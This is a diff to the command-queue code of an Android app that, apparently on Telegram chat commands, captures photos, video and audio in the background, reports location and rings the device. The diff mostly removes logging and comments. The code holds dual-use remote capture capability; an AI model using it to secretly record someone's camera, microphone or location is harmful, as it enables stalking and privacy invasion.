@@ -3,7 +3,6 @@ package com.save.me
 import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Build
-import android.util.Log
 import androidx.core.content.ContextCompat
 import androidx.room.*
 import kotlinx.coroutines.*
@@ -27,10 +26,8 @@ object CommandManager {
         appContext = context.applicationContext
         dao = CommandQueueDatabase.getInstance(appContext).commandQueueDao()
         initialized = true
-        Log.d("CommandManager", "Initialized CommandManager in event-driven mode (resource release on recording/capture end)")
     }
 
-    // Only photo, video, audio are exclusive and must be queued/serialized
     fun isExclusiveType(type: String): Boolean =
         type == "photo" || type == "video" || type == "audio"
 
@@ -49,8 +46,6 @@ object CommandManager {
             UploadManager.init(context)
             UploadManager.sendTelegramMessage(chatId, ackMsg)
         }
-
-        Log.d("CommandManager", "Dispatch called: type=$type, camera=$camera, flash=$flash, quality=$quality, duration=$duration, chatId=$chatId")
         if (isExclusiveType(type)) {
             enqueue(
                 QueuedCommand(
@@ -58,58 +53,37 @@ object CommandManager {
                 )
             )
         } else {
-            // Non-exclusive commands (location, ring, vibrate) run immediately and in parallel
             startOtherActionInvoke(context, type, duration, chatId, System.currentTimeMillis())
         }
     }
 
     fun enqueue(command: QueuedCommand) {
         queueScope.launch {
-            val id = dao.insert(CommandEntity.fromQueuedCommand(command))
-            Log.d("CommandManager", "Enqueued command: $command (db id: $id)")
-            val pending = dao.getAllPending()
-            Log.d("CommandManager", "Current pending queue: $pending")
+            dao.insert(CommandEntity.fromQueuedCommand(command))
             processQueueOnce()
         }
     }
 
     private suspend fun processQueueOnce() {
         val pending = dao.getAllPending()
-        Log.d("CommandManager", "Processing queue (event-driven). runningResources=$runningResources, runningJobIds=$runningJobIds, pendingQueue=$pending")
-        if (pending.isEmpty()) {
-            Log.d("CommandManager", "Queue is empty; nothing to process.")
-            return
-        }
+        if (pending.isEmpty()) return
 
         resourceMutex.withLock {
             for (cmd in pending) {
-                Log.d("CommandManager", "Checking command $cmd: runningJobIds=$runningJobIds, runningResources=$runningResources")
-                if (runningJobIds.contains(cmd.id)) {
-                    Log.d("CommandManager", "Skipping $cmd because it is already running.")
-                    continue
-                }
+                if (runningJobIds.contains(cmd.id)) continue
                 val neededResources = getResourceGroups(cmd.type)
-                if (neededResources.any { it in runningResources }) {
-                    Log.d("CommandManager", "Skipping $cmd because neededResources=$neededResources are in runningResources=$runningResources")
-                    continue
-                }
+                if (neededResources.any { it in runningResources }) continue
 
                 runningResources.addAll(neededResources)
                 runningJobIds.add(cmd.id)
-                Log.d("CommandManager", "STARTING $cmd, acquired resources $neededResources: runningResources now $runningResources")
-
                 queueScope.launch {
                     try {
                         dao.updateStatus(cmd.id, "running")
                         withContext(Dispatchers.IO) {
                             executeCommand(appContext, cmd.toQueuedCommand(), cmd.id)
                         }
-                        // Do NOT mark as done or free resources here!
-                        // Wait for onCommandActionComplete to be called.
                     } catch (e: Exception) {
                         dao.updateStatus(cmd.id, "failed")
-                        Log.e("CommandManager", "Command failed: ${cmd.type}", e)
-                        // Free resources if action failed to start
                         onCommandActionComplete(cmd.id)
                     }
                 }
@@ -117,10 +91,6 @@ object CommandManager {
         }
     }
 
-    /**
-     * This must be called by ForegroundActionService (or wherever your recording/capture completes)
-     * to mark the command as done and free resources.
-     */
     fun onCommandActionComplete(commandId: Long) {
         queueScope.launch {
             val cmd = dao.getById(commandId)
@@ -130,12 +100,8 @@ object CommandManager {
                 resourceMutex.withLock {
                     runningResources.removeAll(neededResources)
                     runningJobIds.remove(commandId)
-                    Log.d("CommandManager", "Freed resources for $cmd: runningResources now $runningResources")
                 }
-                Log.d("CommandManager", "Command $cmd completed (onCommandActionComplete). Checking queue for next eligible command (event-driven)...")
                 processQueueOnce()
-            } else {
-                Log.w("CommandManager", "onCommandActionComplete: command id $commandId not found")
             }
         }
     }
@@ -150,16 +116,11 @@ object CommandManager {
         }
     }
 
-    /**
-     * @param commandId Pass the database id of the command so onCommandActionComplete can be called later.
-     */
     suspend fun executeCommand(context: Context, command: QueuedCommand, commandId: Long) {
         val (type, camera, flash, quality, duration, chatId) = command
         val deviceNickname = Preferences.getNickname(context) ?: "Device"
 
-        // Only check permissions here. Do NOT create overlays or SurfaceHolders outside the service!
         if (!checkPermissions(context, type)) {
-            Log.e("CommandManager", "Required permissions not granted for $type")
             NotificationHelper.showNotification(
                 context, "Permission Error",
                 "Required permissions not granted for $type. Please allow all required permissions in system settings."
@@ -167,11 +128,9 @@ object CommandManager {
             if (!chatId.isNullOrBlank()) {
                 UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Required permissions not granted for $type.")
             }
-            // Free resources if not granted
             onCommandActionComplete(commandId)
             return
         }
-        // For photo/video, also check overlay permission, but do not create overlays here!
         if ((type == "photo" || type == "video") && Build.VERSION.SDK_INT >= 34) {
             if (!OverlayHelper.hasOverlayPermission(context)) {
                 OverlayHelper.requestOverlayPermission(context)
@@ -180,17 +139,21 @@ object CommandManager {
                     "Permission Needed",
                     "Grant 'Display over other apps' for full background capability."
                 )
-                // Free resources if permission not granted
                 onCommandActionComplete(commandId)
                 return
             }
         }
-
-        // Start ForegroundActionService with parameters only!
-        startCameraActionInvoke(context, type, camera, flash, quality, duration, chatId, commandId)
+        startActionInvoke(context, type, camera, flash, quality, duration, chatId, commandId)
     }
 
-    private fun startCameraActionInvoke(
+    private fun normalizeDuration(duration: String?): Double {
+        val minMinutes = 0.1
+        val maxMinutes = 60.0
+        val minutes = duration?.toDoubleOrNull()?.coerceIn(minMinutes, maxMinutes) ?: 1.0
+        return minutes
+    }
+
+    private fun startActionInvoke(
         context: Context,
         type: String,
         camera: String?,
@@ -200,23 +163,40 @@ object CommandManager {
         chatId: String?,
         commandId: Long
     ) {
-        val cam = camera ?: "front"
-        val flashEnabled = flash == "true"
-        val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
-        val durationInt = duration?.toIntOrNull() ?: if (type == "photo") 0 else 60
-
-        ForegroundActionService.startCameraAction(
-            context,
-            type,
-            JSONObject().apply {
-                put("camera", cam)
-                put("flash", flashEnabled)
-                put("quality", qualityInt)
-                put("duration", durationInt)
-            },
-            chatId,
-            commandId // Pass commandId so service can report completion!
-        )
+        when (type) {
+            "photo", "video" -> {
+                val cam = camera ?: "front"
+                val flashEnabled = flash == "true"
+                val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
+                val durationMinutes = normalizeDuration(duration)
+                ForegroundActionService.startCameraAction(
+                    context,
+                    type,
+                    JSONObject().apply {
+                        put("camera", cam)
+                        put("flash", flashEnabled)
+                        put("quality", qualityInt)
+                        put("duration", durationMinutes)
+                    },
+                    chatId,
+                    commandId
+                )
+            }
+            "audio" -> {
+                val durationMinutes = normalizeDuration(duration)
+                ForegroundActionService.startAudioAction(
+                    context,
+                    JSONObject().apply {
+                        put("duration", durationMinutes)
+                    },
+                    chatId,
+                    commandId
+                )
+            }
+            else -> {
+                startOtherActionInvoke(context, type, duration, chatId, commandId)
+            }
+        }
     }
 
     private fun startOtherActionInvoke(
@@ -227,17 +207,6 @@ object CommandManager {
         commandId: Long
     ) {
         when (type) {
-            "audio" -> {
-                val durationInt = duration?.toIntOrNull() ?: 60
-                ForegroundActionService.startAudioAction(
-                    context,
-                    JSONObject().apply {
-                        put("duration", durationInt)
-                    },
-                    chatId,
-                    commandId // Pass commandId so service can report completion!
-                )
-            }
             "location" -> {
                 ForegroundActionService.startLocationAction(context, chatId, commandId)
             }
@@ -249,7 +218,6 @@ object CommandManager {
             }
             else -> {
                 NotificationHelper.showNotification(context, "Unknown Action", "Action $type is not supported.")
-                Log.w("CommandManager", "Unknown action type: $type")
                 if (!chatId.isNullOrBlank()) {
                     val deviceNickname = Preferences.getNickname(context) ?: "Device"
                     val errMsg = "[$deviceNickname] Error: Action $type is not supported."
@@ -284,18 +252,14 @@ object CommandManager {
         return true
     }
 
-    // Only photo, video, audio are exclusive; location, ring, vibrate are non-exclusive (empty set)
     fun getResourceGroups(type: String): Set<ResourceGroup> = when (type) {
         "photo" -> setOf(ResourceGroup.CAMERA)
         "video" -> setOf(ResourceGroup.CAMERA, ResourceGroup.MIC)
         "audio" -> setOf(ResourceGroup.MIC)
-        // location, ring, vibrate: empty set, i.e. non-exclusive
         else -> emptySet()
     }
 
-    // Called by UploadManager to re-check the queue after upload completes.
     fun triggerQueueProcess() {
-        Log.d("CommandManager", "triggerQueueProcess called; event-driven queue check.")
         queueScope.launch {
             processQueueOnce()
         }
